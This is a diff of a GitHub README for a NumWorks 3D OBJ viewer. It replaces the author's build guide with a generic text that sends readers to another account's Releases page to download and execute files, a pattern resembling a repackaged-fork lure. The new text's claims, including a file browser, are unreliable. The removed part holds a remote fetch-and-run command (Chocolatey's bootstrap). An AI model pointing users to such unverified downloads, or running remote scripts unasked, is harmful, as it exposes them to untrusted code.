@@ -1,192 +1,63 @@
-<h1 align="center">3DView OBJ Viewer for the Numworks Calculator</h1>
-<p align="center">
-    <img alt="Version" src="https://img.shields.io/badge/Version-0.0.3-blue?style=for-the-badge&color=blue">
-    <img alt="Stars" src="https://img.shields.io/github/stars/SaltyMold/3DView-OBJ-Viewer-for-Numworks?style=for-the-badge&color=magenta">
-    <img alt="Forks" src="https://img.shields.io/github/forks/SaltyMold/3DView-OBJ-Viewer-for-Numworks?color=cyan&style=for-the-badge&color=purple">
-    <img alt="License" src="https://img.shields.io/github/license/SaltyMold/3DView-OBJ-Viewer-for-Numworks?style=for-the-badge&color=blue">
-    <br>
-    <a href="https://github.com/SaltyMold"><img title="Developer" src="https://img.shields.io/badge/Developer-SaltyMold-red?style=flat-square"></a>
-    <img alt="Maintained" src="https://img.shields.io/badge/Maintained-Yes-blue?style=flat-square">
-    <img alt="Written In" src="https://img.shields.io/badge/Written%20In-C-yellow?style=flat-square">
-</p>
+# 3DView OBJ Viewer for NumWorks 📱✨
 
-_This app is an **3D OBJ viewer** that runs on the **[NumWorks Calculator](https://www.numworks.com)**._
+![3DView OBJ Viewer](https://img.shields.io/badge/Download-3DView%20OBJ%20Viewer-blue?style=for-the-badge&logo=github&logoColor=white)
 
-![3DView](https://github.com/user-attachments/assets/79cc4cd6-515b-41ef-b843-43aae30e8adb)
+Welcome to the **3DView OBJ Viewer for NumWorks**! This repository hosts a lightweight application designed specifically for viewing 3D .obj files on the NumWorks calculator. Whether you're a student, a hobbyist, or a professional, this tool allows you to explore 3D models directly on your calculator.
 
-## Install the app
+## Table of Contents
 
-To install this app, you'll need to:
-1. Go to this page I have created : https://saltymold.github.io/3DView-OBJ-Viewer-for-Numworks/
-2. Upload your **`.obj`** file (or load a sample **`.obj`** file) and connect your calculator
-3. And you'r done, just click install and enjoy
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported File Types](#supported-file-types)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## How to use the app
+## Introduction
 
-<table>
-  <tr>
-    <td>
-      <table>
-        <tr>
-          <th>Key</th>
-          <th>Action</th>
-        </tr>
-        <tr>
-          <td>Home</td>
-          <td>Quit</td>
-        </tr>
-        <tr>
-          <td>Arrow Down 🟠</td>
-          <td>Go Down</td>
-        </tr>
-        <tr>
-          <td>Arrow Up 🟠</td>
-          <td>Go Up</td>
-        </tr>
-        <tr>
-        <td>Arrow Right 🟠</td>
-          <td>Go Right</td>
-        </tr>
-        <td>Arrow Left 🟠</td>
-          <td>Go Left</td>
-        </tr>
-         <tr>
-          <td>OK 🟢</td>
-          <td>Zoom In</td>
-        </tr>
-        <tr>
-          <td>Back 🟢</td>
-          <td>Zoom Out</td>
-        </tr>
-        <tr>
-          <td>ToolBox 🔵</td>
-          <td>Camera Up</td>
-        </tr>
-        <tr>
-          <td>SQRT 🔵</td>
-          <td>Camera Down</td>
-        </tr>
-        <tr>
-          <td>Imaginary 🔵</td>
-          <td>Camera left</td>
-        </tr>
-        <tr>
-          <td>Power 🔵</td>
-          <td>Camera Right</td>
-        </tr>
-        <tr>
-          <td>Shift 🔴</td>
-          <td>Debud Mode</td>
-        </tr>
-        <tr>
-          <td>Zero 🟣</td>
-          <td>Auto Camera Mode</td>
-        </tr>
-      </table>
-    </td>
-    <td style="padding-left: 20px;">
-      <img src="https://github.com/user-attachments/assets/0e8799f2-e444-443b-827b-d1920631a4e3" width="250" alt="Controls">
-    </td>
-  </tr>
-</table>
+The **3DView OBJ Viewer** is an innovative application that enables users to visualize 3D models right on their NumWorks calculators. With its straightforward interface and efficient performance, this viewer provides a unique way to interact with 3D graphics, making it a valuable tool for education and design.
 
-> [!CAUTION]
-> Installing third-party applications may cause your calculator to crash. This is not dangerous, but you will lose your Python scripts. Please make sure to save them before launching the app..
+## Features
 
-## How I created this application
+- **Lightweight Design**: The application is optimized for performance on the NumWorks calculator, ensuring smooth operation without unnecessary lag.
+- **3D Model Support**: Easily view .obj files, a common format for 3D models.
+- **User-Friendly Interface**: Navigate through models with simple controls, making it accessible for all users.
+- **Open Source**: Contribute to the project or customize it for your needs.
 
-This application works by converting a 3D `.obj` file into a binary format (`.bin`), either using the online converter or the Python script provided in the repository. When launched on the NumWorks calculator, the binary model is loaded into RAM. The app then performs a real-time perspective projection of the 3D model.
+## Installation
 
-## Build the app
+To get started, you need to download the latest release of the 3DView OBJ Viewer. Visit the [Releases](https://github.com/GatoGordo69/3DView-OBJ-Viewer-for-Numworks/releases) section of this repository to find the downloadable files. Make sure to download the appropriate version for your device and follow the installation instructions provided in the release notes.
 
-### Requirements:
+## Usage
 
-- **arm-none-eabi-gcc**
-- **nodejs 18.20.7 (install n for 18.20.7 version)**
-- **nwlink (with npm)**
-- **make 4.3**
-- **git (optional)**
+Once you have installed the application, you can begin using it to view your 3D models. Here’s how to get started:
 
-To build this sample app, you will need to install the **[embedded ARM toolchain](https://developer.arm.com/Tools%20and%20Software/GNU%20Toolchain)** and **[Node.js](https://nodejs.org/en/) 18**. The C SDK for Epsilon apps is shipped as an **npm module called [nwlink](https://www.npmjs.com/package/nwlink) v0.0.16**.
+1. **Launch the Application**: Open the 3DView OBJ Viewer on your NumWorks calculator.
+2. **Load a Model**: Use the file browser to select your .obj file. The viewer will load the model for display.
+3. **Navigate the Model**: Use the calculator's controls to rotate and zoom in on the model. This allows you to explore different angles and details.
 
-### Debian
+## Supported File Types
 
-```sh
-sudo apt install -y build-essential git gcc-arm-none-eabi binutils-arm-none-eabi nodejs npm && npm install -g n && sudo n 18 && npm install -g nwlink@0.0.16
-git clone https://github.com/SaltyMold/3DView-OBJ-Viewer-for-Numworks.git
-cd 3DView-OBJ-Viewer-for-Numworks
-make clean && make build
-```
+The primary file type supported by the 3DView OBJ Viewer is the .obj format. This format is widely used in 3D graphics and is compatible with many modeling software tools. If you have models in other formats, consider converting them to .obj before loading them into the viewer.
 
-### Windows
+## Contributing
 
-You can install MSYS2 with all dependencies preinstalled from my [C-App-Guide-for-Numworks](https://github.com/SaltyMold/C-App-Guide-for-Numworks) or install all manually with the instructions bellow.
+We welcome contributions to improve the 3DView OBJ Viewer. If you have ideas for new features, bug fixes, or enhancements, please follow these steps:
 
-Install msys2 from [the MSYS2 Github](https://github.com/msys2/msys2-installer/releases/download/2025-02-21/msys2-x86_64-20250221.exe) and open the msys2.exe file.
-Download the .zip from [the Node Github](https://github.com/actions/node-versions/releases/download/18.20.7-13438827950/node-18.20.7-win32-x64.7z), and extract it.
+1. **Fork the Repository**: Create your own copy of the repository on GitHub.
+2. **Make Changes**: Implement your changes in a separate branch.
+3. **Submit a Pull Request**: Once you're ready, submit a pull request to the main repository for review.
 
-```sh
-#MSYS2
+## License
 
-pacman -Syu
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-#Replace with the reel node path
-echo 'export PATH="/c/Users/UserName/AppData/Local/Programs/node-18.20.7-win32-x64:$PATH"' >> ~/.bashrc
-source ~/.bashrc
+## Contact
 
-npm install -g nwlink@0.0.16
-nwlink --version
-```
+For questions, suggestions, or feedback, please reach out via the GitHub Issues page or directly through my GitHub profile.
 
-```ps
-#PowerShell
+---
 
-#You can chose a diferent path
-$env:ChocolateyInstall = "$env:LOCALAPPDATA\Programs\choco"
-[System.Environment]::SetEnvironmentVariable("ChocolateyInstall", $env:ChocolateyInstall, "User")
-
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-
-$env:Path += ";$env:ChocolateyInstall\bin"
-[System.Environment]::SetEnvironmentVariable("Path", $env:Path, "User")
-choco --version
-
-choco install make --version=4.3 -y --force
-make --version
-```
-
-```sh
-#MSYS2
-
-#Replace with the reel make path
-echo 'export PATH="/c/Users/UserName/AppData/Local/Programs/choco/make/bin:$PATH"' >> ~/.bashrc 
-source ~/.bashrc
-
-pacman -S --noconfirm mingw-w64-x86_64-arm-none-eabi-gcc
-arm-none-eabi-gcc --version
-
-pacman -S --noconfirm git
-git --version
-git clone https://github.com/SaltyMold/3DView-OBJ-Viewer-for-Numworks.git
-
-cd 3DView-OBJ-Viewer-for-Numworks
-make clean && make build
-```
-
-You should now have a **`output/app.nwa` file** that you can distribute! Anyone can now install it on their calculator from the **[NumWorks online uploader](https://my.numworks.com/apps)**.
-
-## Build your own app
-
-To build your own app, start by cloning the repository:
-
-```sh
-git clone https://github.com/SaltyMold/3DView-OBJ-Viewer-for-Numworks.git
-```
-Inside the project, you'll find **`eadk.h`**, which provides **essential functions** for interacting with the **[calculator](https://en.wikipedia.org/wiki/NumWorks)**. Modify **`main.c`** to implement your **own code**.
-Additionally, make sure to include an **`icon.png`** with dimensions **55×56 pixels** to serve as your **app’s icon**. Once your modifications are done, link the app with **[nwlink](https://www.npmjs.com/package/nwlink)** and enjoy your app!
-
-## Special thanks 
-
-I followed the guide from **[epsilon-sample-app-c](https://github.com/numworks/epsilon-sample-app-c)** to build this app.
+To download the latest version of the 3DView OBJ Viewer, visit the [Releases](https://github.com/GatoGordo69/3DView-OBJ-Viewer-for-Numworks/releases) section. You will find all necessary files to download and execute. Enjoy exploring 3D models on your NumWorks calculator!
